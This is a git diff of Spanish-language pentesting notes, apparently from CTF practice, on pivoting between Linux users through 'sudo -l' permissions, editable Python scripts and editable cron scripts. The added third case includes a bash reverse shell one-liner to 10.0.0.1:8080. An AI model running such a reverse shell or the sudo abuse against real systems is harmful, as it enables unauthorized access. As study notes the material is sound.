@@ -1,4 +1,4 @@
-#### CASO 1
+#### CASO 1(comandos como sudo)
 Si vemos que al hacer **sudo -l**, hay algún usuario que nos permita ejecutar comandos sin contraseña. Algo así:
 ```bash
 User_ww-data may run the following commands on watcher: 
@@ -18,7 +18,7 @@ sudo -u toby /bin/bash
 
 ya que toby puede ejecutar cualquier comando sin necesidad de contraseña, también podemos ejecutar una bash como toby y ya habríamos pivotado de usuario.
 
-#### CASO 2
+#### CASO 2 (script editable en python)
 (parecido al anterior)
 Si al hacer **sudo -l** vemos que podemos ejecutar un script específico en **python**, y encima podemos editar ese script, o como en este caso, tenemos un script no editable, pero que llama a otro script que si lo es. pues editamos dicho script y lo dejamos algo parecido a esto:
 
@@ -37,3 +37,16 @@ después de editar dicho script: (OJO A LA RUTA ABSOLUTA)
 ```bash
 sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py
 ```
+
+#### CASO 3 (Script editable con tarea cron)
+Si localizamos un script que se ejecuta como tarea cron y encima es editable, podriamos pivotar al usuario propietario de ese script.
+
+**Tenemos 2 formas**
+```bash
+sudo -u <usuario_propietario_del_script> /bin/bash
+
+O establecer una reverse shell. 
+
+"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+```
+
